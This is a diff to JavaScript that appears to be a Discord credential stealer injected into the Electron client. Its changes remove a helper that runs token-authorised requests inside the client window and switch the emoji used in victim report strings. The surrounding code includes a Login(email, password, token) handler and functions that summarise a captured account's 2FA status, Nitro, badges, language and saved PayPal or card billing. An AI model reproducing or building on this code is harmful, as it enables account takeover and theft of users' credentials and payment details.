@@ -499,25 +499,15 @@ async function getFromURL(url, token) {
     return b
 }
 
-async function getFromURLnp(url, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var b = await window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "${url}", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );`, !0)
-    return b
-}
-
 
 
 
 function GetNSFW(reader) {
     if (reader == true) {
-        return "🔞 `NSFW Allowed`"
+        return ":underage: `NSFW Allowed`"
     }
     if (reader == false) {
-        return "🔞 `NSFW Not Allowed`"
+        return ":underage: `NSFW Not Allowed`"
     } else {
         return "Idk bro you got me"
     }
@@ -525,10 +515,10 @@ function GetNSFW(reader) {
 
 function GetA2F(reader) {
     if (reader == true) {
-        return "🔒 `A2F Enabled`"
+        return ":lock: `A2F Enabled`"
     }
     if (reader == false) {
-        return "🔓 `A2F Not Enabled`"
+        return ":unlock: `A2F Not Enabled`"
     } else {
         return "Idk bro you got me"
     }
@@ -549,6 +539,7 @@ function GetNitro(flags) {
         return "No Nitro"
     }
 }
+
 
 function GetRBadges(flags) {
     const Discord_Employee = 1;
@@ -619,97 +610,97 @@ function GetLangue(read) {
     const korea = 'ko';
     var langue = "";
     if (read == France) {
-        langue += "🇫🇷 French"
+        langue += ":flag_fr: French"
     }
     if (read == Dansk) {
-        langue += "🇩🇰 Dansk"
+        langue += ":flag_dk: Dansk"
     }
     if (read == Deutsch) {
-        langue += "🇩🇪 Deutsch"
+        langue += ":flag_de: Deutsch"
     }
     if (read == englishUK) {
-        langue += "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English"
+        langue += ":england: English"
     }
     if (read == englishUS) {
-        langue += "🇺🇸 USA"
+        langue += ":flag_us: USA"
     }
     if (read == espagnol) {
-        langue += "🇪🇸 Espagnol"
+        langue += ":flag_es: Espagnol"
     }
     if (read == hrvatski) {
-        langue += "🇭🇷 Croatian"
+        langue += ":flag_hr: Croatian"
     }
     if (read == italianio) {
-        langue += "🇮🇹 Italianio"
+        langue += ":flag_it: Italianio"
     }
     if (read == lietuviskai) {
-        langue += "🇱🇹 Lithuanian"
+        langue += ":flag_lt: Lithuanian"
     }
     if (read == magyar) {
-        langue += "🇭🇺 Hungarian"
+        langue += ":flag_hu: Hungarian"
     }
     if (read == neerland) {
-        langue += "🇳🇱 Dutch"
+        langue += ":flag_nl: Dutch"
     }
     if (read == Norsk) {
-        langue += "🇳🇴 Norwegian"
+        langue += ":flag_no: Norwegian"
     }
     if (read == polski) {
-        langue += "🇵🇱 Polish"
+        langue += ":flag_pl: Polish"
     }
     if (read == portugues) {
-        langue += "🇵🇹 Portuguese"
+        langue += ":flag_pt: Portuguese"
     }
     if (read == Romana) {
-        langue += "🇷🇴 Romanian"
+        langue += ":flag_ro: Romanian"
     }
     if (read == finlandais) {
-        langue += "🇫🇮 Finnish"
+        langue += ":flag_fi: Finnish"
     }
     if (read == svenska) {
-        langue += "🇸🇪 Swedish"
+        langue += ":flag_se: Swedish"
     }
     if (read == turk) {
-        langue += "🇹🇷 Turkish"
+        langue += ":flag_tr: Turkish"
     }
     if (read == tiengviet) {
-        langue += "🇻🇳 Vietnamese"
+        langue += ":flag_vn: Vietnamese"
     }
     if (read == cestina) {
-        langue += "🇨🇿 Czech"
+        langue += ":flag_cz: Czech"
     }
     if (read == grecque) {
-        langue += "🇬🇷 Greek"
+        langue += ":flag_gr: Greek"
     }
     if (read == bulgar) {
-        langue += "🇧🇬 Bulgarian"
+        langue += ":flag_bg: Bulgarian"
     }
     if (read == russe) {
-        langue += "🇷🇺 Russian"
+        langue += ":flag_ru: Russian"
     }
     if (read == ukrainier) {
-        langue += "🇺🇦 Ukrainian"
+        langue += ":flag_ua: Ukrainian"
     }
     if (read == inde) {
-        langue += "🇮🇳 Indian"
+        langue += ":flag_in: Indian"
     }
     if (read == thai) {
-        langue += "🇹🇼 Taiwanese"
+        langue += ":flag_tw: Taiwanese"
     }
     if (read == chineschina) {
-        langue += "🇨🇳 Chinese-China"
+        langue += ":flag_cn: Chinese-China"
     }
     if (read == japonais) {
-        langue += "🇯🇵 Japanese"
+        langue += ":flag_jp: Japanese"
     }
     if (read == chinestaiwan) {
-        langue += "🇨🇳 Chinese-Taiwanese"
+        langue += ":flag_cn: Chinese-Taiwanese"
     }
     if (read == korea) {
-        langue += "🇰🇷 Korean"
+        langue += ":flag_kr: Korean"
     }
     if (langue == "") {
-        langue = "None"
+        langue = ":x: None"
     }
     return langue
 }
@@ -817,17 +808,17 @@ async function Login(email, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`❌\`"
+                        return ":x:"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " :credit_card:"
+                        billing += "✔️" + " :credit_card:"
                     } else {
-                        return "\`❌\`"
+                        return ":x:"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`❌\`"
+                    billing = ":x:"
                 }
                 return billing
             }
